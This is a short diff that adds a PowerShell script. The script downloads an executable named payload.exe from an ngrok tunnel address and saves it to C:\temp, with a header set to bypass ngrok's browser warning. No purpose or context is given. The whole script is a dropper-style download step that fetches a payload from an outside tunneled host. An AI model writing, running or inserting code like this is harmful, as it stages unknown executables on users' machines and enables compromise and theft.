@@ -1,0 +1,6 @@
+$url = "https://charmed-strictly-ringtail.ngrok-free.app/payload.exe"
+$output = "C:\temp\payload.exe"
+
+$webClient = New-Object System.Net.WebClient
+$webClient.Headers.Add("ngrok-skip-browser-warning", "true")
+$webClient.DownloadFile($url, $output)
